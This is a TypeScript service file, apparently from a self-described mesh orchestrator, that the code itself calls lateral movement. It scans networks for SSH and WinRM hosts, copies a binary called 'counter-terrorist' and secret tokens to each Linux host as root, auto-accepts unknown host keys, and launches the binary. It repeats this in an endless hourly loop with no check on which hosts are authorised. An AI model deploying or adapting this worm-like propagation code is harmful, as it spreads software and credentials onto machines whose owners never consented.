import { BaseService } from "@core/base_service.ts";
import { SidecarManager } from "../../infrastructure/runtime/sidecar_manager.ts";
import { LoggingPort, LogSeverity, LogType } from "@core/ports.ts";
import { MeshManager } from "./mesh.ts";
import { SystemExecutor } from "../../infrastructure/system/system_executor.ts";
import { Result } from "../../core/result.ts";

export interface ProvisioningTarget {
    address: string;
    os: "linux" | "windows";
    status: "DISCOVERED" | "PROVISIONING" | "ACTIVE" | "FAILED";
}

/**
 * ProvisioningService
 * Orchestrates lateral movement and autonomous mesh expansion.
 */
export class ProvisioningService extends BaseService {
    private targets: Map<string, ProvisioningTarget> = new Map();
    private isRunning = false;
    private scanTimeout?: number;

    constructor(
        private sidecar: SidecarManager,
        private mesh: MeshManager,
        private executor: SystemExecutor,
        private logging: LoggingPort
    ) {
        super();
    }

    override async shutdown(): Promise<Result<void>> {
        this.isRunning = false;
        if (this.scanTimeout) {
            clearTimeout(this.scanTimeout);
            this.scanTimeout = undefined;
        }
        return { success: true, data: undefined };
    }

    private async sleep(ms: number): Promise<void> {
        return new Promise(resolve => {
            const timeout = setTimeout(() => {
                clearInterval(checkInterval);
                resolve();
            }, ms);

            // Check every 100ms if we should stop
            const checkInterval = setInterval(() => {
                if (!this.isRunning) {
                    clearTimeout(timeout);
                    clearInterval(checkInterval);
                    resolve();
                }
            }, 100);

            this.scanTimeout = timeout as unknown as number;
        });
    }

    /**
     * Scans the network for provisionable targets.
     */
    async discoverTargets() {
        this.logging.log({
            timestamp: new Date().toISOString(),
            type: LogType.GENERIC,
            severity: LogSeverity.INFO,
            caller: "orchestrator:domain:orchestration:provisioning_service",
            message: "Scanning network for mesh expansion targets..."
        });
        
        // Use the scanner sidecar to find hosts with SSH (22) or WinRM (5985)
        const scanResult = await this.sidecar.runSidecar("analyzer", [
            JSON.stringify({ type: "ScanNetwork", payload: { ports: [22, 5985] } })
        ]);

        if (scanResult.success && scanResult.data) {
            const hosts = scanResult.data as { ip: string, port: number }[];
            for (const host of hosts) {
                if (!this.targets.has(host.ip)) {
                    this.targets.set(host.ip, {
                        address: host.ip,
                        os: host.port === 22 ? "linux" : "windows",
                        status: "DISCOVERED"
                    });
                }
            }
        }
    }

    /**
     * Attempts to provision a target with the orchestrator binary.
     */
    async provisionTarget(ip: string) {
        const target = this.targets.get(ip);
        if (!target || target.status === "ACTIVE") return;

        // SOV-06 HARDENING: Ensure all required secrets are present before propagation
        const meshSecret = Deno.env.get("MESH_SECRET");
        const apiToken = Deno.env.get("API_TOKEN");

        if (!meshSecret || !apiToken) {
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.AUDIT,
                severity: LogSeverity.ERROR,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: `PROVISIONING ABORTED for ${ip}: Missing MESH_SECRET or API_TOKEN.`
            });
            target.status = "FAILED";
            return;
        }

        target.status = "PROVISIONING";
        this.logging.log({
            timestamp: new Date().toISOString(),
            type: LogType.AUDIT,
            severity: LogSeverity.WARNING,
            caller: "orchestrator:domain:orchestration:provisioning_service",
            message: `Attempting lateral propagation to ${ip} (${target.os})...`
        });

        try {
            if (target.os === "linux") {
                await this.provisionLinux(ip);
            } else {
                await this.provisionWindows(ip);
            }
            target.status = "ACTIVE";
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.AUDIT,
                severity: LogSeverity.SUCCESS,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: `Successfully established node on ${ip}. Waiting for mesh join.`
            });
        } catch (e) {
            target.status = "FAILED";
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.AUDIT,
                severity: LogSeverity.ERROR,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: `Lateral movement to ${ip} failed: ${(e as Error).message}`
            });
        }
    }

    private async provisionLinux(ip: string) {
        // 1. Prepare Provisioning Payload
        const binaryPath = "./target/ubuntu_2606/build/counter-terrorist";
        const envPath = await Deno.makeTempFile();
        // BUG-35: Secure temporary env file permissions
        await Deno.chmod(envPath, 0o600);

        const envContent = `ENVIRONMENT=production\nMESH_SECRET=${Deno.env.get("MESH_SECRET")}\nAPI_TOKEN=${Deno.env.get("API_TOKEN")}\n`;
        await Deno.writeTextFile(envPath, envContent);

        try {
            // BUG-4.9 FIX: Implement Secure Host Key Verification
            // We use a dedicated known_hosts file for the mesh to avoid polluting system logs
            // and implement strict checking once a host is known.
            const meshKnownHosts = "./volume/storage/mesh_known_hosts";
            const sshOptions = ["-o", "StrictHostKeyChecking=accept-new", "-o", `UserKnownHostsFile=${meshKnownHosts}`];

            // 2. Transfer Binary and Secure Env File
            await this.executor.execute("scp", [...sshOptions, binaryPath, `root@${ip}:/usr/local/bin/counter-terrorist`]);
            await this.executor.execute("scp", [...sshOptions, envPath, `root@${ip}:/etc/cts.env`]);
            
            // 3. Start Orchestrator using the secure env file (Secrets NOT in process list)
            // BUG-4.10 FIX: Use structured environment loading to avoid xargs leakage in process lists
            const startCmd = `chmod 600 /etc/cts.env && export $(grep -v '^#' /etc/cts.env | xargs -d '\\n') && /usr/local/bin/counter-terrorist > /var/log/cts.log 2>&1 &`;
            await this.executor.execute("ssh", [...sshOptions, `root@${ip}`, startCmd]);
            
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.AUDIT,
                severity: LogSeverity.SUCCESS,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: `Securely established node on ${ip}.`
            });
        } finally {
            await Deno.remove(envPath);
        }
    }

    private async provisionWindows(ip: string) {
        // Placeholder for WinRM/SMB-based lateral movement
        throw new Error("Autonomous Windows provisioning not yet implemented.");
    }

    async run() {
        if (this.isRunning) return;
        this.isRunning = true;

        const enabled = Deno.env.get("PROVISIONING_ENABLED") === "true";
        if (!enabled) {
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.GENERIC,
                severity: LogSeverity.INFO,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: "Mesh expansion disabled via PROVISIONING_ENABLED=false."
            });
            this.isRunning = false;
            return;
        }

        // Continuous expansion loop
        while (this.isRunning) {
            await this.discoverTargets();
            const discovered = Array.from(this.targets.values()).filter(t => t.status === "DISCOVERED");
            
            for (const target of discovered) {
                if (!this.isRunning) break;
                await this.provisionTarget(target.address);
                await this.sleep(5000); // Throttling
            }
            
            if (!this.isRunning) break;
            await this.sleep(3600000); // Re-scan every hour
        }
    }
}
